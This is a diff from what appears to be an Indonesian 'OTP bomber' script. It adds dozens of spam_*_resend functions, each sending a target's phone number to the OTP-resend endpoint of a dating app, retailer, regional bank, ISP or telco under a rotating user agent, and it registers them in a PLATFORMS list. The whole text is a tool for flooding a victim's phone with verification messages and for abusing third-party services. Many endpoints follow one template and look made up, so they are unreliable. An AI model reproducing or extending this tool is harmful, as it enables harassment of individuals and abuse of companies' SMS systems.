+    url = "https://api.tinder.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://tinder.com",
+        "Referer": "https://tinder.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 220. Bumble
+def spam_bumble_resend(phone_plus):
+    url = "https://api.bumble.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://bumble.com",
+        "Referer": "https://bumble.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 221. OKCupid
+def spam_okcupid_resend(phone_plus):
+    url = "https://api.okcupid.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://okcupid.com",
+        "Referer": "https://okcupid.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 222. Zoosk
+def spam_zoosk_resend(phone_plus):
+    url = "https://api.zoosk.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://zoosk.com",
+        "Referer": "https://zoosk.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 223. Zalora
+def spam_zalora_resend(phone_plus):
+    url = "https://api.zalora.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://zalora.co.id",
+        "Referer": "https://zalora.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 224. Berrybenka
+def spam_berrybenka_resend(phone_plus):
+    url = "https://api.berrybenka.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://berrybenka.com",
+        "Referer": "https://berrybenka.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 225. Hijup
+def spam_hijup_resend(phone_plus):
+    url = "https://api.hijup.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://hijup.com",
+        "Referer": "https://hijup.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 226. Bhinneka
+def spam_bhinneka_resend(phone_plus):
+    url = "https://api.bhinneka.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://bhinneka.com",
+        "Referer": "https://bhinneka.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 227. Sephora
+def spam_sephora_resend(phone_plus):
+    url = "https://api.sephora.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://sephora.co.id",
+        "Referer": "https://sephora.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 228. Guardian
+def spam_guardian_resend(phone_plus):
+    url = "https://api.guardian.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://guardian.co.id",
+        "Referer": "https://guardian.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 229. Century
+def spam_century_resend(phone_plus):
+    url = "https://api.century.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://century.co.id",
+        "Referer": "https://century.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 230. Adidas Indonesia
+def spam_adidas_resend(phone_plus):
+    url = "https://api.adidas.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://adidas.co.id",
+        "Referer": "https://adidas.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 231. Nike Indonesia
+def spam_nike_resend(phone_plus):
+    url = "https://api.nike.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://nike.co.id",
+        "Referer": "https://nike.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 232. Uniqlo Indonesia
+def spam_uniqlo_resend(phone_plus):
+    url = "https://api.uniqlo.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://uniqlo.co.id",
+        "Referer": "https://uniqlo.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 233. H&M Indonesia
+def spam_hm_resend(phone_plus):
+    url = "https://api.hm.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://hm.co.id",
+        "Referer": "https://hm.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 234. Zara Indonesia
+def spam_zara_resend(phone_plus):
+    url = "https://api.zara.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://zara.co.id",
+        "Referer": "https://zara.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 235. Cotton On Indonesia
+def spam_cottonon_resend(phone_plus):
+    url = "https://api.cottonon.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://cottonon.co.id",
+        "Referer": "https://cottonon.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 236. Lotus
+def spam_lotus_resend(phone_plus):
+    url = "https://api.lotus.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://lotus.co.id",
+        "Referer": "https://lotus.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 237. Ralali
+def spam_ralali_resend(phone_plus):
+    url = "https://api.ralali.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://ralali.com",
+        "Referer": "https://ralali.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 238. Distributor
+def spam_distributor_resend(phone_plus):
+    url = "https://api.distributor.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://distributor.co.id",
+        "Referer": "https://distributor.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 239. MNC Play
+def spam_mncplay_resend(phone_plus):
+    url = "https://api.mncplay.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://mncplay.com",
+        "Referer": "https://mncplay.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 240. MyRepublic
+def spam_myrepublic_resend(phone_plus):
+    url = "https://api.myrepublic.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://myrepublic.co.id",
+        "Referer": "https://myrepublic.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 241. Biznet
+def spam_biznet_resend(phone_plus):
+    url = "https://api.biznet.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://biznet.net.id",
+        "Referer": "https://biznet.net.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 242. First Media
+def spam_firstmedia_resend(phone_plus):
+    url = "https://api.firstmedia.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://firstmedia.com",
+        "Referer": "https://firstmedia.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 243. Oxygen
+def spam_oxygen_resend(phone_plus):
+    url = "https://api.oxygen.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://oxygen.co.id",
+        "Referer": "https://oxygen.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 244. CBN
+def spam_cbn_resend(phone_plus):
+    url = "https://api.cbn.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://cbn.co.id",
+        "Referer": "https://cbn.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 245. XL Home
+def spam_xlhome_resend(phone_plus):
+    url = "https://api.xlhome.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://xlhome.co.id",
+        "Referer": "https://xlhome.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 246. Smartfren
+def spam_smartfren_resend(phone_plus):
+    url = "https://api.smartfren.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://smartfren.com",
+        "Referer": "https://smartfren.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 247. IM3
+def spam_im3_resend(phone_plus):
+    url = "https://api.im3.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://im3.com",
+        "Referer": "https://im3.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 248. Axis
+def spam_axis_resend(phone_plus):
+    url = "https://api.axis.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://axis.co.id",
+        "Referer": "https://axis.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 249. Tri
+def spam_tri_resend(phone_plus):
+    url = "https://api.tri.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://tri.co.id",
+        "Referer": "https://tri.co.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 250. By.U
+def spam_byu_resend(phone_plus):
+    url = "https://api.byu.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://byu.id",
+        "Referer": "https://byu.id/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 251. BTS (Bank Tabungan Negara)
+def spam_btn_resend2(phone_08):
+    url = "https://api.btn.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://btn.co.id",
+        "Referer": "https://btn.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 252. BJB (Bank Jawa Barat)
+def spam_bjb_resend2(phone_08):
+    url = "https://api.bjb.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://bjb.co.id",
+        "Referer": "https://bjb.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 253. Bank Jatim
+def spam_bankjatim_resend(phone_08):
+    url = "https://api.bankjatim.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://bankjatim.com",
+        "Referer": "https://bankjatim.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 254. Bank Sulsel
+def spam_banksulsel_resend(phone_08):
+    url = "https://api.banksulsel.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://banksulsel.com",
+        "Referer": "https://banksulsel.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 255. Bank Sumut
+def spam_banksumut_resend(phone_08):
+    url = "https://api.banksumut.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://banksumut.com",
+        "Referer": "https://banksumut.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 256. Bank Kaltim
+def spam_bankkaltim_resend(phone_08):
+    url = "https://api.bankkaltim.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://bankkaltim.com",
+        "Referer": "https://bankkaltim.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 257. Bank Papua
+def spam_bankpapua_resend(phone_08):
+    url = "https://api.bankpapua.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://bankpapua.com",
+        "Referer": "https://bankpapua.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 258. Bank Maluku
+def spam_bankmaluku_resend(phone_08):
+    url = "https://api.bankmaluku.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://bankmaluku.com",
+        "Referer": "https://bankmaluku.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None                                                                    
 # ============================================================
 # DAFTAR PLATFORM (72+)
 # ============================================================
@@ -3436,6 +5060,107 @@ PLATFORMS = [
 ("WeChat (Resend)", spam_wechat_resend, "plus"),
 ("Signal (Resend)", spam_signal_resend, "plus"),
 ("Discord (Resend)", spam_discord_resend, "plus"),
+("TIX ID (Resend)", spam_tixid_resend, "plus"),
+("M-Tix (Resend)", spam_mtix_resend, "plus"),
+("Pelago (Resend)", spam_pelago_resend, "plus"),
+("Kkday (Resend)", spam_kkday_resend, "plus"),
+("Sakuku (Resend)", spam_sakuku_resend, "plus"),
+("BNI Mobile (Resend)", spam_bni_mobile_resend, "08"),
+("CIMB Niaga (Resend)", spam_cimb_resend, "08"),
+("Danamon (Resend)", spam_danamon_resend, "08"),
+("Permata (Resend)", spam_permata_resend, "08"),
+("OCBC (Resend)", spam_ocbc_resend, "08"),
+("UOB (Resend)", spam_uob_resend, "08"),
+("HSBC (Resend)", spam_hsbc_resend, "08"),
+("Citibank (Resend)", spam_citibank_resend, "08"),
+("Standard Chartered (Resend)", spam_scb_resend, "08"),
+("Maybank (Resend)", spam_maybank_resend, "08"),
+("Mega (Resend)", spam_mega_resend, "08"),
+("Bukopin (Resend)", spam_bukopin_resend, "08"),
+("Jago (Resend)", spam_jago_resend, "08"),
+("Aladin (Resend)", spam_aladin_resend, "08"),
+("Seabank (Resend)", spam_seabank_resend, "08"),
+("Superbank (Resend)", spam_superbank_resend, "08"),
+("Neo Commerce (Resend)", spam_neocommerce_resend, "08"),
+("Bank Raya (Resend)", spam_bankraya_resend, "08"),
+("Home Credit (Resend)", spam_homecredit_resend, "08"),
+("BFI Finance (Resend)", spam_bfi_resend, "08"),
+("FIF Group (Resend)", spam_fif_resend, "08"),
+("Mandiri Tunas Finance (Resend)", spam_mtf_resend, "08"),
+("OTO Group (Resend)", spam_oto_resend, "08"),
+("Suzuki Finance (Resend)", spam_suzuki_finance_resend, "08"),
+("Honda Finance (Resend)", spam_honda_finance_resend, "08"),
+("Yamaha Finance (Resend)", spam_yamaha_finance_resend, "08"),
+("Astra Credit (Resend)", spam_astra_credit_resend, "08"),
+("Bank Mega (Resend)", spam_bankmega_resend, "08"),
+("Bank Permata (Resend)", spam_bankpermata_resend, "08"),
+("Bank Mayapada (Resend)", spam_mayapada_resend, "08"),
+("Bank Ina (Resend)", spam_bankina_resend, "08"),
+("Bank Sinarmas (Resend)", spam_sinarmas_resend, "08"),
+("Bank Bukopin (Resend)", spam_bukopin_resend2, "08"),
+("Bank Jago (Resend)", spam_bankjago_resend, "08"),
+("Bank Aladin (Resend)", spam_bankaladin_resend, "08"),
+("Seabank (Resend)", spam_seabank_resend2, "08"),
+("Superbank (Resend)", spam_superbank_resend2, "08"),
+("Bank Neo Commerce (Resend)", spam_neocommerce_resend2, "08"),
+("Bank Raya (Resend)", spam_bankraya_resend2, "08"),
+("Bank Capital (Resend)", spam_bankcapital_resend, "08"),
+("Bank Maspion (Resend)", spam_bankmaspion_resend, "08"),
+("Bank Ganesha (Resend)", spam_bankganesha_resend, "08"),
+("Bank Bumi Arta (Resend)", spam_bumiarta_resend, "08"),
+("Bank Ekonomi (Resend)", spam_bankekonomi_resend, "08"),
+("Bank Hana (Resend)", spam_bankhana_resend, "08"),
+("Bank ICBC (Resend)", spam_bankicbc_resend, "08"),
+("Zoom (Resend)", spam_zoom_resend, "plus"),
+("Shopify (Resend)", spam_shopify_resend, "plus"),
+("Wix (Resend)", spam_wix_resend, "plus"),
+("WordPress (Resend)", spam_wordpress_resend, "plus"),
+("Tumblr (Resend)", spam_tumblr_resend, "plus"),
+("Flickr (Resend)", spam_flickr_resend, "plus"),
+("Imgur (Resend)", spam_imgur_resend, "plus"),
+("Pinterest (Resend)", spam_pinterest_resend, "plus"),
+("Snapchat (Resend)", spam_snapchat_resend, "plus"),
+("LinkedIn (Resend)", spam_linkedin_resend, "plus"),
+("Tinder (Resend)", spam_tinder_resend, "plus"),
+("Bumble (Resend)", spam_bumble_resend, "plus"),
+("OKCupid (Resend)", spam_okcupid_resend, "plus"),
+("Zoosk (Resend)", spam_zoosk_resend, "plus"),
+("Zalora (Resend)", spam_zalora_resend, "plus"),
+("Berrybenka (Resend)", spam_berrybenka_resend, "plus"),
+("Hijup (Resend)", spam_hijup_resend, "plus"),
+("Bhinneka (Resend)", spam_bhinneka_resend, "plus"),
+("Sephora (Resend)", spam_sephora_resend, "plus"),
+("Guardian (Resend)", spam_guardian_resend, "plus"),
+("Century (Resend)", spam_century_resend, "plus"),
+("Adidas (Resend)", spam_adidas_resend, "plus"),
+("Nike (Resend)", spam_nike_resend, "plus"),
+("Uniqlo (Resend)", spam_uniqlo_resend, "plus"),
+("H&M (Resend)", spam_hm_resend, "plus"),
+("Zara (Resend)", spam_zara_resend, "plus"),
+("Cotton On (Resend)", spam_cottonon_resend, "plus"),
+("Lotus (Resend)", spam_lotus_resend, "plus"),
+("Ralali (Resend)", spam_ralali_resend, "plus"),
+("Distributor (Resend)", spam_distributor_resend, "plus"),
+("MNC Play (Resend)", spam_mncplay_resend, "plus"),
+("MyRepublic (Resend)", spam_myrepublic_resend, "plus"),
+("Biznet (Resend)", spam_biznet_resend, "plus"),
+("First Media (Resend)", spam_firstmedia_resend, "plus"),
+("Oxygen (Resend)", spam_oxygen_resend, "plus"),
+("CBN (Resend)", spam_cbn_resend, "plus"),
+("XL Home (Resend)", spam_xlhome_resend, "plus"),
+("Smartfren (Resend)", spam_smartfren_resend, "plus"),
+("IM3 (Resend)", spam_im3_resend, "plus"),
+("Axis (Resend)", spam_axis_resend, "plus"),
+("Tri (Resend)", spam_tri_resend, "plus"),
+("By.U (Resend)", spam_byu_resend, "plus"),
+("BTN (Resend)", spam_btn_resend2, "08"),
+("BJB (Resend)", spam_bjb_resend2, "08"),
+("Bank Jatim (Resend)", spam_bankjatim_resend, "08"),
+("Bank Sulsel (Resend)", spam_banksulsel_resend, "08"),
+("Bank Sumut (Resend)", spam_banksumut_resend, "08"),
+("Bank Kaltim (Resend)", spam_bankkaltim_resend, "08"),
+("Bank Papua (Resend)", spam_bankpapua_resend, "08"),
+("Bank Maluku (Resend)", spam_bankmaluku_resend, "08"),
 ]
 
 # ============================================================
